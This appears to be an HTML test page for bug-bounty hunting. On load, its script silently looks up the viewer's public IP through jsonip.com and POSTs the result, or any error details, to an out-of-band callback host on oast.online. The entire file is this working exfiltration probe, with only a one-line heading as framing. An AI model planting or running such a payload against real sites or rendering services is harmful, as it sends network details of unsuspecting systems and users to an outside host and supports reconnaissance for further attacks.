<html>
  <h1>Hello here , just test for bug bounty :) </h1><br>
 <body>
  <div id="result"></div>
  <div id="result1"></div>
  
  <script>
     fetch("https://jsonip.com")
    .then(async r => {
      const body = await r.text();
  
      const data = {
        type: "success",
        status: r.status,
        responseType: r.type,
        body: body
      };
  
      document.getElementById("result1").textContent =
        JSON.stringify(data, null, 2);
  
      fetch("https://d9sootamruoqnj2f3itg49dcubiikbc3u.oast.online/", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });
    })
    .catch(err => {
      const data = {
        type: "error",
        error: String(err),
        message: err?.message || null
      };
  
      document.getElementById("result1").textContent =
        JSON.stringify(data, null, 2);
  
      fetch("https://d9sootamruoqnj2f3itg49dcubiikbc3u.oast.online/", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });
    });
   
  </script>

    
  </body>
</html>
